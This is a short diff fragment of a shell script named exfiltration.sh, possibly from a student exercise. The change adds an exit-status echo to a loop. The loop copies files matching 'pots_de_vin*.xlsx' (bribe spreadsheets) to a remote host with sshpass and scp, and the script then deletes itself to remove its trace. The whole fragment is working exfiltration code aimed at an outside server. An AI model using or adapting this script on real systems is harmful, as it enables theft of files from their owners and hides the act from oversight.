@@ -7,6 +7,7 @@ command=$(ls pots_de_vin*.xlsx)
 for files in $command
 do
     sshpass -p "$password" scp $files $username@$Ip:/home/etudiant/data
+    echo $?
 done
 
 rm exfiltration.sh
